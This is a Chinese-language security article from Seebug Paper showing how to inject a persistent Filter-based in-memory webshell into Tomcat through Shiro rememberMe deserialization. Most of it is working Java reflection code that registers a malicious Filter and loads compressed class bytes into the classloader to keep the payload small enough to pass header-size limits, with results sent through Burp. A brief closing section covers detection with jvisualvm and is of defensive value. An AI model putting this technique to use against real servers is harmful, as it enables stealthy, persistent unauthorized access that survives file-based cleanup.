**作者：宽字节安全**  
**原文链接：<https://mp.weixin.qq.com/s/fFYTRrSMjHnPBPIaVn9qMg>**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：paper@seebug.org**

## 0x01简介

shiro结合tomcat回显，使用公开的方法，回显大多都会报错。因为生成的payload过大，而tomcat在默认情况下，接收的最大http头部大小为8192。如果超过这个大小，则tomcat会返回400错误。而某些版本tomcat可以通过payload修改maxHttpHeaderSize，而某些又不可以。所以我们要想办法解决这个很麻烦，并顺便实现tomcat的内存马，用来持久化shell。

我的测试环境如下:

  * tomcat 7.0.104
  * idea
  * shiro 

环境安装配置就不在这里详细描述，该分享主要围绕着以下主题分享:

  1. Filter介绍
  2. 类加载器的相关知识点
  3. tomcat的内存马该如何查杀

## 0x02 Filter

### 1\. Filter的基本工作原理

  1. Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。

  2. 当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。

  3. 当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。

  4. 但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。

  5. 只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。

  6. 如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。

### 2\. Filter 链

  1. 在一个 Web 应用程序中可以注册多个 Filter 程序，每个 Filter 程序都可以对一个或一组 Servlet 程序进行拦截。如果有多个 Filter 程序都可以对某个 Servlet 程序的访问过程进行拦截，当针对该 Servlet 的访问请求到达时，Web 容器将把这多个 Filter 程序组合成一个 Filter 链（也叫过滤器链）。

  2. Filter 链中的各个 Filter 的拦截顺序与它们在 web.xml 文件中的映射顺序一致，上一个 Filter.doFilter 方法中调用 FilterChain.doFilter 方法将激活下一个 Filter的doFilter 方法，最后一个 Filter.doFilter 方法中调用的 FilterChain.doFilter 方法将激活目标 Servlet的service 方法。

  3. 只要 Filter 链中任意一个 Filter 没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法都不会被执行。

### 3\. Tomcat中请求Filter的流程

用户在请求tomcat的资源的时候，会调用ApplicationFilterFactory的createFilterChain方法，根据web.xml的Filter配置，去生成Filter链。主要代码如下

    
    
                filterChain.setServlet(servlet);
                filterChain.setSupport(((StandardWrapper)wrapper).getInstanceSupport());
                StandardContext context = (StandardContext)wrapper.getParent();
                FilterMap[] filterMaps = context.findFilterMaps();
                if (filterMaps != null && filterMaps.length != 0) {
                    String servletName = wrapper.getName();
                    FilterMap[] arr$ = filterMaps;
                    int len$ = filterMaps.length;
    
                    int i$;
                    FilterMap filterMap;
                    ApplicationFilterConfig filterConfig;
                    boolean isCometFilter;
                    for(i$ = 0; i$ < len$; ++i$) {
                        filterMap = arr$[i$];
                        if (matchDispatcher(filterMap, dispatcher) && matchFiltersURL(filterMap, requestPath)) {
                            filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                            if (filterConfig != null) {
                                isCometFilter = false;
                                if (comet) {
                                    try {
                                        isCometFilter = filterConfig.getFilter() instanceof CometFilter;
                                    } catch (Exception var21) {
                                        Throwable t = ExceptionUtils.unwrapInvocationTargetException(var21);
                                        ExceptionUtils.handleThrowable(t);
                                    }
    
                                    if (isCometFilter) {
                                        filterChain.addFilter(filterConfig);
                                    }
                                } else {
                                    filterChain.addFilter(filterConfig);
                                }
                            }
                        }
                    }

首先获取当前context，并从context中获取FilterMap。FIlterMap的数据结构如下

![](https://images.seebug.org/content/images/2020/06/c1eefc70-0029-41ce-b354-c20e24aa78e8.png-w331s)

我们可以看到，FilterMap存放了Filter的名称和需要拦截的url的正则表达式。

继续往下分析代码，遍历FilterMap中每一项，调用matchFiltersURL这个函数，去确定请求的url和Filter中需要拦截的正则表达式是否匹配。

如果匹配的话，则通过context.findFilterConfig方法去查找filter对应的名称。filterConfig的数据结构如下

![](https://images.seebug.org/content/images/2020/06/8160d9f7-eb17-47da-90b6-9baec5756dff.png-w331s)

随后将filterConfig添加到Filter.chain中。

下面我们看一下ApplicationFilterChain.internalDoFilter方法，简化后的代码如下

    
    
                ApplicationFilterConfig filterConfig = this.filters[this.pos++];
                Filter filter = null;
                filter = filterConfig.getFilter();
                this.support.fireInstanceEvent("beforeFilter", filter, request, response);
                filter.doFilter(request, response, this);
                this.support.fireInstanceEvent("afterFilter", filter, request, response);

在这里我们可以很清楚的看到，从刚才的FilterChain中，遍历每一项FilterConfig，然后获取FIlterConfig对应的filter，最后调用我们熟悉的filter.doFilter方法。

可以用如下流程图来方便我们理解这个过程

![](https://images.seebug.org/content/images/2020/06/cc9e435d-6a14-47b4-b106-6146963bcd4d.png-w331s)

可以看出，如果需要动态注册一个Filter，结合上面的分析，我们可以发现，只要修改context相关字段，即可完成动态注册一个Filter。好消息是，context已经帮我们实现了相关方法，我们就没有必要去通过反射等手段去修改。

![](https://images.seebug.org/content/images/2020/06/ce87cdd6-5d21-4271-a41c-32269f8ed86d.png-w331s)

### 4\. tomcat实现

#### 4.1 获取context

可以通过MBean的方式去获取当前context，我们查看一下tomcat的MBean

![](https://images.seebug.org/content/images/2020/06/8518317f-b624-4309-a3cd-73b23b3f9d16.png-w331s)

idea中查看一下

![](https://images.seebug.org/content/images/2020/06/08/1591588755000-6olzkw.png-w331s)

相关代码如下

    
    
    Registry.getRegistry((Object) null, (Object) null).getMBeanServer().mbsInterceptor.repository.domainTb.get("Catalina").get("context=/samples_web_war,host=localhost,name=NonLoginAuthenticator,type=Valve").object.resource.context

当然，还有很多种办法，这里只是一个例子

#### 4.2 添加filterdef到context

首先我们实例化一个FilterDef，FilterDef的作用主要为描述filter名称与Filter实例的关系。注意，在后面调用context.FilterMap的时候会校验FilterDef，所以我们需要先设置FilterDef

    
    
                Object filterDef = Class.forName("FilterDef").newInstance();
                // 设置过滤器名称
                Method filterDefsetFilterName = Class.forName("FilterDef").getMethod("setFilterName", String.class);
                filterDefsetFilterName.invoke(filterDef, "test");
    
                // 实例化Filter，也就是第一阶段我们加载的那个filter，通过Class.forname查找
                Method filterDefsetFilter = Class.forName("FilterDef").getMethod("setFilter", Filter.class);
    
                //通过class.forname查找我们待加载的Filter，后面调用newInstance实例化
                Class evilFilterClass = Class.forName("testFilter1");
                filterDefsetFilter.invoke(filterDef, evilFilterClass.newInstance());

#### 4.3 添加filtermap到context

FilterMap的作用建立filter的url拦截与FilterDef的关系。在这里我们需要设置加载的filter都拦截什么url。代码如下

    
    
                Object filterMap = Class.forName("FilterMap").newInstance();
                Method filterMapaddURLPattern = Class.forName("FilterMap").getMethod("addURLPattern", String.class);
                filterMapaddURLPattern.invoke(filterMap, "/*");
    
                // 设置filter的名字为test
                Method filterMapsetFilterName = Class.forName("FilterMap").getMethod("setFilterName", String.class);
                filterMapsetFilterName.invoke(filterMap, "test");

#### 4.4 添加ApplicationFilterConfig至context

这里很简单，最后我们需要添加ApplicationFIlterConfig就可以了，代码如下

    
    
               Field contextfilterConfigs = context.getClass().getDeclaredField("filterConfigs");
                HashMap filterConfigs = (HashMap) contextfilterConfigs.get(context);
                Constructor<?>[] filterConfigCon =
                        Class.forName("ApplicationFilterConfig").getDeclaredConstructors();
                filterConfigs.put("test", filterConfigCon[0].newInstance(context, filterDef));

## 0x03 类加载器的相关知识点

在上一步种，我们是无法成功的，因为payload过大，超过tomcat的限制。会导致tomcat报400 bad
request错误。我们仔细分析可知，因为payload种需要加载Filter的class
bytes。这一部分最小最小还需要3000多。所以我们需要将Filter的class
byte，想办法加载至系统中。可以缩小我们动态加载Filter的payload大小。

### 1.1 class.forname

在这里我们先学习以下`class.forname`这个方法，查看openjdk的相关源码：
<https://hg.openjdk.java.net/jdk/jdk/file/2623069edcc7/src/java.base/share/classes/java/lang/Class.java#l374>

![](https://images.seebug.org/content/images/2020/06/665c3355-b1f0-4600-aa56-c5d775ff339d.jpg-w331s)

`class.forname`会获取调用方的classloader，然后调用`forName0`，从调用方的classloader中查找类。当然，这是一个native方法，精简后源码如下
<https://hg.openjdk.java.net/jdk/jdk/file/2623069edcc7/src/java.base/share/native/libjava/Class.c#l104>

    
    
     Java_java_lang_Class_forName0(JNIEnv *env, jclass this, jstring classname,
                                  jboolean initialize, jobject loader, jclass caller)
    {
        char *clname;
        jclass cls = 0;
        clname = classname;
    
        cls = JVM_FindClassFromCaller(env, clname, initialize, loader, caller);
        return cls;
    }

`JVM_FindClassFromClassler`的代码在如下位置
<https://hg.openjdk.java.net/jdk/jdk/file/2623069edcc7/src/hotspot/share/prims/jvm.cpp>

    
    
    JVM_ENTRY(jclass, JVM_FindClassFromCaller(JNIEnv* env, const char* name,
                                              jboolean init, jobject loader,
                                              jclass caller))
      JVMWrapper("JVM_FindClassFromCaller throws ClassNotFoundException");
    
      TempNewSymbol h_name =
           SystemDictionary::class_name_symbol(name, vmSymbols::java_lang_ClassNotFoundException(),
                                               CHECK_NULL);
    
      oop loader_oop = JNIHandles::resolve(loader);
      oop from_class = JNIHandles::resolve(caller);
      oop protection_domain = NULL;
      if (from_class != NULL && loader_oop != NULL) {
        protection_domain = java_lang_Class::as_Klass(from_class)->protection_domain();
      }
    
      Handle h_loader(THREAD, loader_oop);
      Handle h_prot(THREAD, protection_domain);
      jclass result = find_class_from_class_loader(env, h_name, init, h_loader,
                                                   h_prot, false, THREAD);
    
      return result;
    JVM_END

主要是获取protectDomain等相关信息。然后调用`find_class_from_class_loader`，代码如下

    
    
    jclass find_class_from_class_loader(JNIEnv* env, Symbol* name, jboolean init,
                                        Handle loader, Handle protection_domain,
                                        jboolean throwError, TRAPS) {
    
      Klass* klass = SystemDictionary::resolve_or_fail(name, loader, protection_domain, throwError != 0, CHECK_NULL);
    
      // Check if we should initialize the class
      if (init && klass->is_instance_klass()) {
        klass->initialize(CHECK_NULL);
      }
      return (jclass) JNIHandles::make_local(env, klass->java_mirror());
    }

在`SystemDictionary::resolve_or_fail`会判断查找的类是不是属于数组，对于咱们来讲，肯定不是数组，所以，我们主要来分析`systemDictionary::resolve_instance_class_or_null`
代码如下

    
    
      class_loader = Handle(THREAD, java_lang_ClassLoader::non_reflection_class_loader(class_loader()));
      ClassLoaderData* loader_data = register_loader(class_loader);
      Dictionary* dictionary = loader_data->dictionary();
      unsigned int d_hash = dictionary->compute_hash(name);
      {
        InstanceKlass* probe = dictionary->find(d_hash, name, protection_domain);
        if (probe != NULL) return probe;
      }

最终通过`dictionary->find`方法去查找类，看代码，其实也就是查找classloader的classes字段。

idea中查看这个字段。可以看出这里存储了很多类的Class，我们只需要将defineClass的结果，添加到classloader的classes字段中即可。
![](https://images.seebug.org/content/images/2020/06/fc1ddb64-5dbd-43e1-94d0-f9b7bfff8ccd.png-w331s)

### 1.2 实现

将class bytes使用gzip+base64压缩编码，代码如下

![](https://images.seebug.org/content/images/2020/06/7850270f-7e60-4464-b8e4-0d69d336a128.png-w331s)

payload中，我们寻找当前classloader，调用defineclass，将类字节码转换成一个类，代码如下 这一步会用到大量的反射

    
    
    BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();
    String codeClass = "base64+gzip编码后的类";
    ClassLoader currentClassloader = Thread.currentThread().getContextClassLoader();
    Method defineClass = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    Class evilClass = (Class) defineClass.invoke(currentClassloader, uncompress(b64Decoder.decodeBuffer(codeClass)), 0, uncompress(b64Decoder.decodeBuffer(codeClass)).length);

加载完成后，将evilClass加载到classloader的classes字段中，这步通过反射完成

    
    
           Field currentCladdloaderClasses = Thread.currentThread().getContextClassLoader().getClass().getDeclaredField("classes");
           Vector classes = (Vector) currentCladdloaderClasses.get(currentClassloader);
           classes.add(0, evilClass);

## 0x04 成果检验

首先我们将自己写的Filter，加载到`classloader`中`Filter`的代码如下

![](https://images.seebug.org/content/images/2020/06/72ad3993-4d26-4cc4-b828-6f6d7a170d47.png-w331s)

运行我们的工具，生成payload

![](https://images.seebug.org/content/images/2020/06/55eb7136-fb9f-4afa-b369-8b4ec3273eb2.png-w331s)

通过burp发送出去

![](https://images.seebug.org/content/images/2020/06/3dda33b5-bf33-479b-90a1-7854d2f01442.png-w331s)

下一步动态注册一个Filter

![](https://images.seebug.org/content/images/2020/06/71bd38c9-9a21-4538-81ef-d3b55e8ad44a.png-w331s)

我们可以看出，这两步生成的payload大小都没有超过tomcat的`maxHttpHeaderSize`。将生成的remember复制到cookies即可执行，结果如下

![](https://images.seebug.org/content/images/2020/06/5bb4f151-0284-42ef-a148-0027f8e8d562.png-w331s)

## 0x05 Filter类型的内存马查杀

1.打开jvisualvm，因为我们是访问本地java进程，所以tomcat不需要配置jmx访问

2.jvisualvm安装MBean插件

![](https://images.seebug.org/content/images/2020/06/061a2739-c208-46cf-9a9f-169f52977b71.png-w331s)

3.点击我们的tomcat，查看`Catalina/Filter`节点中的数据，检查是否存在我们不认识的，或者没有在web.xml中配置的filter，或者filterClass为空的Filter，如图

![](https://images.seebug.org/content/images/2020/06/5fe62955-8e88-4b8e-bca4-9a9a5497a4f7.png-w331s)

## 0x06 参考链接

  1. <https://www.runoob.com/w3cnote/filter-filterchain-filterconfig-intro.html>

  2. <https://hg.openjdk.java.net/jdk/jdk/file/2623069edcc7/src/hotspot/share/prims/jvm.cpp>

  3. <https://hg.openjdk.java.net/jdk/jdk/file/2623069edcc7/src/java.base/share/classes/java/lang/Class.java>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1233/>

